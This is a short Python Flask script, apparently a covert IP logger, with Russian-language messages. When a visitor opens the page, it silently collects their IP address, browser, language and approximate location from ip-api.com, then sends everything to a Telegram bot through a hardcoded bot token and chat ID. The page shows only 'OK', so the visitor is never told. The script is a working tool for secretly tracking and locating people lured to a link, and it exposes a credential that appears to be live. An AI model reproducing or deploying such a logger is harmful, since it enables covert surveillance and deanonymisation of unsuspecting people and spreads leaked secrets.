from flask import Flask, request
import requests

app = Flask(name)

TOKEN = "8839750399:AAEYXRzgs9lAqpGXkbFrhVCwaTiprIuuC38"
CHAT_ID = "1838683997"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            return f"Страна: {data.get('country')}\nГород: {data.get('city')}\nПровайдер: {data.get('isp')}"
    except:
        pass
    return "Не удалось определить"

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    lang = request.headers.get("Accept-Language")
    geo = get_geo(ip)
    msg = f"🚨 НОВЫЙ ЗАХОД! 🚨\n\n📡 IP: {ip}\n🔍 Браузер: {ua}\n🗣 Язык: {lang}\n🌍 {geo}"
    send_telegram(msg)
    return "OK"

app.run(host="0.0.0.0", port=10000)
